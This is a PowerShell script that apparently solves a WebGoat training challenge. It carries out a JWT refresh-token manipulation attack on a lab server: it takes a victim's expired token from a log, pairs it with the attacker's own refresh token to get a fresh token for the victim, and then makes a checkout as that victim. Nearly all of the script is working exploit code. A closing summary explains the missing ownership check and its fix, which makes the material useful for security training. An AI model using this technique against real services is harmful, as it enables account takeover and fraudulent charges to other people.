################################################
# JWT Refresh Token Manipulation Attack
# PowerShell Version - No CORS Issues
################################################

$BASE_URL = "http://192.168.254.112:8001/WebGoat"

# Tom's expired token from the access log
$TOMS_EXPIRED_TOKEN = "eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q"

Write-Host "═══════════════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host "   JWT REFRESH TOKEN MANIPULATION ATTACK" -ForegroundColor Yellow
Write-Host "   Challenge: Make Tom pay for the books" -ForegroundColor Yellow
Write-Host "═══════════════════════════════════════════════════════" -ForegroundColor Cyan

# Decode JWT function
function Decode-JWT {
    param([string]$token)
    
    $parts = $token -split '\.'
    if ($parts.Length -ne 3) { return $null }
    
    $payload = $parts[1]
    # Add padding if needed
    $payload += '=' * ((4 - ($payload.Length % 4)) % 4)
    
    # Convert from base64url to base64
    $payload = $payload.Replace('-', '+').Replace('_', '/')
    
    try {
        $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($payload))
        return $decoded | ConvertFrom-Json
    } catch {
        return $null
    }
}

Write-Host "`n[STEP 1] Analyzing Tom's Expired Token from Log" -ForegroundColor Cyan
Write-Host "═══════════════════════════════════════════════════════" -ForegroundColor Cyan

$tomPayload = Decode-JWT -token $TOMS_EXPIRED_TOKEN
Write-Host "Token: $($TOMS_EXPIRED_TOKEN.Substring(0, 50))..." -ForegroundColor Gray
Write-Host "`nDecoded Payload:" -ForegroundColor Yellow
$tomPayload | ConvertTo-Json

$expDate = [DateTimeOffset]::FromUnixTimeSeconds($tomPayload.exp).LocalDateTime
Write-Host "`nUser: $($tomPayload.user)" -ForegroundColor White
Write-Host "Expired: $expDate" -ForegroundColor Red
Write-Host "Status: ❌ EXPIRED" -ForegroundColor Red

Write-Host "`n[STEP 2] Logging in to get YOUR Refresh Token" -ForegroundColor Cyan
Write-Host "═══════════════════════════════════════════════════════" -ForegroundColor Cyan

try {
    $loginBody = @{
        username = "webgoat"
        password = "webgoat"
    } | ConvertTo-Json

    $loginResponse = Invoke-RestMethod -Uri "$BASE_URL/login" `
        -Method POST `
        -ContentType "application/json" `
        -Body $loginBody `
        -SessionVariable webSession

    $myRefreshToken = $loginResponse.refresh_token
    $myAccessToken = $loginResponse.access_token
    
    Write-Host "✅ Login successful!" -ForegroundColor Green
    
    $myPayload = Decode-JWT -token $myAccessToken
    Write-Host "Your user: $($myPayload.user)" -ForegroundColor White
    Write-Host "Your refresh token: $($myRefreshToken.Substring(0, 30))..." -ForegroundColor Gray
    
} catch {
    Write-Host "❌ Login failed: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}

Write-Host "`n[STEP 3] ⚡ EXECUTING THE ATTACK" -ForegroundColor Red
Write-Host "═══════════════════════════════════════════════════════" -ForegroundColor Cyan

Write-Host "`nAttack Details:" -ForegroundColor Yellow
Write-Host "  Authorization Header: Bearer <Tom's EXPIRED token>" -ForegroundColor Gray
Write-Host "  Request Body: { refresh_token: <YOUR refresh token> }" -ForegroundColor Gray
Write-Host "`nVulnerability:" -ForegroundColor Yellow
Write-Host "  Server validates refresh token but doesn't check ownership!" -ForegroundColor Gray

try {
    $attackHeaders = @{
        "Authorization" = "Bearer $TOMS_EXPIRED_TOKEN"
        "Content-Type" = "application/json"
    }
    
    $attackBody = @{
        refresh_token = $myRefreshToken
    } | ConvertTo-Json

    Write-Host "`nSending malicious refresh request..." -ForegroundColor Yellow
    
    $attackResponse = Invoke-RestMethod -Uri "$BASE_URL/JWT/refresh/newToken" `
        -Method POST `
        -Headers $attackHeaders `
        -Body $attackBody `
        -WebSession $webSession

    $tomsNewToken = $attackResponse.access_token
    
    Write-Host "`n✅ ATTACK SUCCESSFUL!" -ForegroundColor Green
    Write-Host "═══════════════════════════════════════════════════════" -ForegroundColor Green
    
    $tomsNewPayload = Decode-JWT -token $tomsNewToken
    Write-Host "`nTom's NEW Token:" -ForegroundColor Yellow
    Write-Host $tomsNewToken -ForegroundColor Cyan
    Write-Host "`nDecoded Payload:" -ForegroundColor Yellow
    $tomsNewPayload | ConvertTo-Json
    Write-Host "`nUser in NEW token: $($tomsNewPayload.user) ← We can act as Tom!" -ForegroundColor Green
    
} catch {
    Write-Host "`n❌ Attack failed: $($_.Exception.Message)" -ForegroundColor Red
    
    if ($_.Exception.Response) {
        $reader = [System.IO.StreamReader]::new($_.Exception.Response.GetResponseStream())
        $responseBody = $reader.ReadToEnd()
        Write-Host "Response: $responseBody" -ForegroundColor Yellow
    }
    exit 1
}

Write-Host "`n[STEP 4] 🛒 Checking out as Tom" -ForegroundColor Cyan
Write-Host "═══════════════════════════════════════════════════════" -ForegroundColor Cyan

try {
    $checkoutHeaders = @{
        "Authorization" = "Bearer $tomsNewToken"
        "Content-Type" = "application/json"
    }
    
    Write-Host "Using Tom's NEW token to checkout..." -ForegroundColor Yellow
    
    $checkoutResponse = Invoke-RestMethod -Uri "$BASE_URL/JWT/refresh/checkout" `
        -Method POST `
        -Headers $checkoutHeaders `
        -WebSession $webSession
    
    Write-Host "`n🎉 SUCCESS! TOM PAID FOR THE BOOKS! 💰" -ForegroundColor Green
    Write-Host "═══════════════════════════════════════════════════════" -ForegroundColor Green
    
    Write-Host "`nCheckout Response:" -ForegroundColor Yellow
    $checkoutResponse | ConvertTo-Json
    
    Write-Host "`n✅ CHALLENGE COMPLETE!" -ForegroundColor Green
    
} catch {
    Write-Host "`n❌ Checkout failed: $($_.Exception.Message)" -ForegroundColor Red
    
    if ($_.Exception.Response) {
        $reader = [System.IO.StreamReader]::new($_.Exception.Response.GetResponseStream())
        $responseBody = $reader.ReadToEnd()
        Write-Host "Response: $responseBody" -ForegroundColor Yellow
    }
    exit 1
}

Write-Host "`n═══════════════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host "   ATTACK SUMMARY" -ForegroundColor Yellow
Write-Host "═══════════════════════════════════════════════════════" -ForegroundColor Cyan

Write-Host @"

📋 What Just Happened:

1. Tom's expired token from log → user='Tom', EXPIRED ❌
2. We logged in → Got OUR refresh token ✅
3. Sent malicious refresh request:
   • Authorization: Tom's EXPIRED token
   • Body: OUR refresh token
4. Server validated OUR refresh token ✅
5. Server issued NEW token for Tom ❌ (Vulnerability!)
6. We used Tom's NEW token to checkout 💰

🔐 Vulnerability:
   Server doesn't check: access_token.user === refresh_token.user
   
   This allows an attacker to refresh someone else's token
   using their own refresh token!

🛠️ Fix:
   Authorization server must verify that the refresh token
   belongs to the same user as the access token.

📚 Reference:
   https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/
   By Mikail - Bugcrowd Private Program

"@ -ForegroundColor White

Write-Host "═══════════════════════════════════════════════════════" -ForegroundColor Green
Write-Host "   Tom's credit card: -$31.53 📉" -ForegroundColor Red
Write-Host "   Your wallet: Saved! 💵" -ForegroundColor Green
Write-Host "═══════════════════════════════════════════════════════" -ForegroundColor Green
